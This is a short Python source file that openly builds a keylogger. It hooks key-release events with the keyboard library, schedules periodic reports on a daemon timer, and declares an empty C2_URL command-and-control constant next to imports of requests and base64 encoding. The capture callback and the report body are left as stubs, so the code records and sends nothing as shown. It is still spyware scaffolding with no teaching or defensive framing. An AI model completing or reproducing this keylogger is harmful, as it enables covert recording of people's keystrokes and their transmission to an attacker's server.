import keyboard
from threading import Timer
from base64 import b64encode
import requests

C2_URL = ""

class Keylogger:
    def __init__(self, interval):
        self.interval = interval

    def callback(self, event):
        # key UP is occured
        pass

    def report(self):
        
        # This function gets called every `self.interval`

        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

    
if __name__ == "__main__":

    keylogger = Keylogger(interval=30)
    keylogger.start()